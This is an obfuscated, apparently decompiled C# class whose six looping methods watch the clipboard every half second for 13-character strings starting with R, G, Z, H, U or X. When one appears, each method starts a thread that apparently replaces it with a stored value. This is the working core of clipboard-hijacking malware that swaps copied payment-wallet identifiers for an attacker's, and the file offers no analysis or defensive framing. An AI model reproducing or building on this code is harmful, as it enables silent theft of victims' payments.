using System;
using System.Threading;
using Client.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns21;

namespace ns29;

public class GClass28
{
	public static void smethod_0()
	{
		string text = "";
		_Closure_0024__R1_002D0 closure_0024__R1_002D = default(_Closure_0024__R1_002D0);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_33, false) != 0 && text.Length == 13 && text.StartsWith("R"))
				{
					closure_0024__R1_002D = new _Closure_0024__R1_002D0(closure_0024__R1_002D);
					closure_0024__R1_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R1_002D._Lambda_0024__R2);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_33);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_1()
	{
		string text = "";
		_Closure_0024__R2_002D2 closure_0024__R2_002D = default(_Closure_0024__R2_002D2);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_34, false) != 0 && text.Length == 13 && text.StartsWith("G"))
				{
					closure_0024__R2_002D = new _Closure_0024__R2_002D2(closure_0024__R2_002D);
					closure_0024__R2_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R2_002D._Lambda_0024__R4);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_34);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_2()
	{
		string text = "";
		_Closure_0024__R3_002D4 closure_0024__R3_002D = default(_Closure_0024__R3_002D4);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_35, false) != 0 && text.Length == 13 && text.StartsWith("Z"))
				{
					closure_0024__R3_002D = new _Closure_0024__R3_002D4(closure_0024__R3_002D);
					closure_0024__R3_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R3_002D._Lambda_0024__R6);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_35);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_3()
	{
		string text = "";
		_Closure_0024__R4_002D6 closure_0024__R4_002D = default(_Closure_0024__R4_002D6);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_36, false) != 0 && text.Length == 13 && text.StartsWith("H"))
				{
					closure_0024__R4_002D = new _Closure_0024__R4_002D6(closure_0024__R4_002D);
					closure_0024__R4_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R4_002D._Lambda_0024__R8);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_36);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_4()
	{
		string text = "";
		_Closure_0024__R5_002D8 closure_0024__R5_002D = default(_Closure_0024__R5_002D8);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_37, false) != 0 && text.Length == 13 && text.StartsWith("U"))
				{
					closure_0024__R5_002D = new _Closure_0024__R5_002D8(closure_0024__R5_002D);
					closure_0024__R5_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R5_002D._Lambda_0024__R10);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_37);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void smethod_5()
	{
		string text = "";
		_Closure_0024__R6_002D10 closure_0024__R6_002D = default(_Closure_0024__R6_002D10);
		while (true)
		{
			try
			{
				text = ((Computer)MyProject.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_38, false) != 0 && text.Length == 13 && text.StartsWith("X"))
				{
					closure_0024__R6_002D = new _Closure_0024__R6_002D10(closure_0024__R6_002D);
					closure_0024__R6_002D._0024VB_0024NonLocal_2 = ((Computer)MyProject.Computer).get_Clipboard();
					Thread thread = new Thread(closure_0024__R6_002D._Lambda_0024__R12);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_38);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
